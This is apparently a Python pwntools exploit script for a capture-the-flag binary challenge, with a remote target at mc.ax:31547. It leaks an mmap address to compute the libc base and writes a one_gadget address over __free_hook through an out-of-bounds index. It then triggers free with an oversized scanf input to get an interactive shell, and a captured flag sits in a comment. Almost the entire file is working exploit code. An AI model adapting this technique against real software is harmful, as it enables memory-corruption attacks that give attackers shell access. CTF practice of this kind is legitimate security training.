#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 1
if debug == 1:
	p = process("./chall")
	libc = ELF("./libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31547)
	libc = ELF("./libc.so.6",checksec=False)

one = [0x4484f,0x448a3,0xe5456]
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)
sla("how big?\n",str(10000000))
p.recvuntil("you are here: 0x")
mmap_addr = int(p.recv(12),16)
libc.address = mmap_addr + 10002416

og = libc.address + one[2]
free_hook = libc.sym['__free_hook']
# global_ = 0x1ebf60 + libc.address
offset = (free_hook - mmap_addr) / 8
gdb.attach(p,'b *$rebase(0x000000000000125C)\nc')
sla("how far?\n",str(offset))
sla("what?\n",'0'*11000 + str(og))
success("libc.address = " + hex(libc.address))
success("og = " + hex(og))
success("mmap_addr = " + hex(mmap_addr))
# flag{sc4nf_i3_4_h34p_ch4l13ng3_TKRs8b1DRlN1hoLJ}

ti()